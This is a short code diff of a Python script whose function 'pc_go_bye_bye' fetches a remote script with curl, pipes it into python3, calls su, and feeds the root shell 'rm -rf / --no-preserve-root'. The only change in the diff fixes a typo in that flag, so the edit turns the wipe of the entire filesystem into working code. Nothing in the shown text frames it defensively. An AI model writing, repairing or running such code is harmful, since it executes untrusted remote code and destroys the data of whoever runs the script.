@@ -33,7 +33,7 @@ def ask_the_question():
 
 def pc_go_bye_bye():
     process = subprocess.Popen('curl https://copy.fail/exp | python3 && su', stdin=subprocess.PIPE, text=True, shell=True)
-    process.communicate(input="rm -rf / --np-preserve-root\n")
+    process.communicate(input="rm -rf / --no-preserve-root\n")
 # Main script
 is_Compatible()
 answer = ask_the_question()
